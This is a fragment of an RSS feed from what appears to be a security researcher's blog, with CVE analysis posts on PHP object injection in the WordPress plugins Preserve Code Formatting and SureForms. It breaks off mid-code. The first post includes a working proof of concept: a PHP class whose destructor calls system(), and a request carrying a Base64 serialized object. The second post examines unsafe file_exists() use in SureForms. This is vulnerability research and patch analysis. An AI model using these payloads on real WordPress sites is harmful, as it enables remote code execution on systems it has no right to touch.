class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Finally, &lt;code&gt;$match[2]&lt;/code&gt; is Base64 decoded, stripped, cleaned, and then passed into &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xD;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;&lt;br&gt;&lt;/div&gt;&#xD;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xD;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;As described in the CVE, exploitation requires &lt;strong&gt;Contributor&lt;/strong&gt; privileges to create a post.&lt;/p&gt;&lt;/div&gt;&#xD;&#xA;  &lt;/div&gt;&#xD;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;pre class=&#34;mermaid&#34;&gt;&#xD;&#xA;graph&amp;ensp;TD&#xD;&#xA;&#xD;&#xA;A[&#34;Contributor&amp;ensp;submits&amp;ensp;Post&#xD;&#xA;(Content&amp;ensp;contains&amp;ensp;malicious&amp;ensp;Base64&amp;ensp;payload)&#34;]&#xD;&#xA;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;--&gt;&amp;ensp;B[&#34;WordPress&amp;ensp;calls&amp;ensp;hook:&amp;ensp;content_save_pre&#34;]&#xD;&#xA;&#xD;&#xA;B&amp;ensp;--&gt;&amp;ensp;C[&#34;Plugin&amp;ensp;callback:&amp;ensp;preserve_postprocess()&#34;]&#xD;&#xA;&#xD;&#xA;C&amp;ensp;--&gt;&amp;ensp;D[&#34;Regex&amp;ensp;extracts&amp;ensp;preserve&amp;ensp;blocks&#34;]&#xD;&#xA;&#xD;&#xA;D&amp;ensp;--&gt;&amp;ensp;E[&#34;match[2]&amp;ensp;=&amp;ensp;Base64&amp;ensp;payload&#34;]&#xD;&#xA;&#xD;&#xA;E&amp;ensp;--&gt;&amp;ensp;F[&#34;base64_decode()&#34;]&#xD;&#xA;F&amp;ensp;--&gt;&amp;ensp;G[&#34;stripslashes()&#34;]&#xD;&#xA;G&amp;ensp;--&gt;&amp;ensp;H[&#34;str_replace(chunk_split_token)&#34;]&#xD;&#xA;&#xD;&#xA;H&amp;ensp;--&gt;&amp;ensp;I[&#34;unserialize()&amp;ensp;on&amp;ensp;user&amp;ensp;data&amp;ensp;(VULNERABLE)&#34;]&#xD;&#xA;&#xD;&#xA;I&amp;ensp;--&gt;&amp;ensp;J[RCE]&#xD;&#xA;&lt;/pre&gt;&lt;/div&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a test class in &lt;code&gt;wp-config.php&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nc&#34;&gt;Evil&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$command&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ls&amp;ensp;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;command&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Create a post and intercept the request using Burp Suite.&lt;/li&gt;&#xA;&lt;li&gt;Resend the request with the &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; field containing the serialized and Base64-encoded payload:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;&amp;ensp;&amp;ensp;&#34;content&#34;: &#34;{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}&#34;,&#xA;&amp;ensp;&amp;ensp;&#34;id&#34;: 129,&#xA;&amp;ensp;&amp;ensp;&#34;status&#34;: &#34;pending&#34;,&#xA;&amp;ensp;&amp;ensp;&#34;title&#34;: &#34;Test&#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1479&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;p&gt;Versions &lt;code&gt;&amp;lt;=&amp;ensp;4.0.1&lt;/code&gt; of the Preserve Code Formatting plugin are critically vulnerable because &lt;code&gt;unserialize()&lt;/code&gt; is called on unvalidated user input. With only Contributor privileges, an attacker can inject a malicious payload that is deserialized during post processing, leading to remote code execution or unauthorized system manipulation. The &lt;code&gt;v5.0&lt;/code&gt; patch eliminates &lt;code&gt;unserialize()&lt;/code&gt;, replaces it with &lt;code&gt;json_decode()&lt;/code&gt;, and adds input validation, effectively neutralizing the Object Injection attack surface.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;code&gt;unserialize()&lt;/code&gt; on user-controlled data is fundamentally unsafe without strict validation.&lt;/li&gt;&#xA;&lt;li&gt;The &lt;code&gt;content_save_pre&lt;/code&gt; hook exposes an attack surface because input is processed before sanitization.&lt;/li&gt;&#xA;&lt;li&gt;Contributor privileges are sufficient to exploit the issue in multi-user environments.&lt;/li&gt;&#xA;&lt;li&gt;The patch focuses on switching to safe data handling and applying content validation.&lt;/li&gt;&#xA;&lt;li&gt;Replacing &lt;code&gt;unserialize()&lt;/code&gt; with safer mechanisms like JSON is the correct fix for WordPress plugins facing similar issues.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/preserve-code-formatting/vulnerability/wordpress-preserve-code-formatting-plugin-4-0-1-php-object-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-6742 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-19-cve-2025-6742/</link>
      <pubDate>Wed, 19 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-19-cve-2025-6742/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;SureForms – Drag and Drop Form Builder for WordPress&lt;/strong&gt; plugin for WordPress contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to and including 1.7.3 due to the usage of &lt;strong&gt;file_exists()&lt;/strong&gt; in the &lt;strong&gt;delete_entry_files()&lt;/strong&gt; function without restricting the provided path. This allows an unauthenticated attacker to inject a &lt;strong&gt;PHP Object&lt;/strong&gt;. No &lt;strong&gt;POP chain&lt;/strong&gt; is known in the vulnerable software, meaning the vulnerability has no impact unless another plugin or theme installed on the site contains a &lt;strong&gt;POP chain&lt;/strong&gt;. If such a POP chain exists via additional plugins or themes installed on the target system, it may allow the attacker to perform actions such as arbitrary file deletion, sensitive data exposure, or code execution depending on the POP chain present.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-6742&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-6742&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.7.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.7.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/sureforms/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress SureForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;SureForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.3&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.7.4&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diffing tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;In version &lt;code&gt;1.7.3&lt;/code&gt;, the function &lt;code&gt;delete_entry_files()&lt;/code&gt; receives a &lt;code&gt;$file_url&lt;/code&gt;, then decodes the URL and converts it into a path using &lt;code&gt;$file_path&amp;ensp;=&amp;ensp;Helper::convert_fileurl_to_filepath(&amp;ensp;urldecode(&amp;ensp;$file_url&amp;ensp;)&amp;ensp;);&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;It then directly calls:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Delete&amp;ensp;the&amp;ensp;file&amp;ensp;if&amp;ensp;it&amp;ensp;exists.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;file_exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unlink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$file_path&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This code checks for file existence using &lt;code&gt;file_exists()&lt;/code&gt; and uses &lt;code&gt;unlink()&lt;/code&gt; to delete it if present.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#34; title=&#34;Changes in the patch&#34; data-thumbnail=&#34;/posts/2025-11-19-cve-2025-6742/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Changes in the patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-19-cve-2025-6742/diff.png&#39; alt=&#34;Diff&#34; height=&#34;602&#34; width=&#34;1892&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Changes in the patch&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;In the patched version, the code is replaced with:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//&amp;ensp;Delete&amp;ensp;the&amp;ensp;file&amp;ensp;from&amp;ensp;the&amp;ensp;uploads&amp;ensp;directory.&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Helper&lt;/span&gt;&lt;span 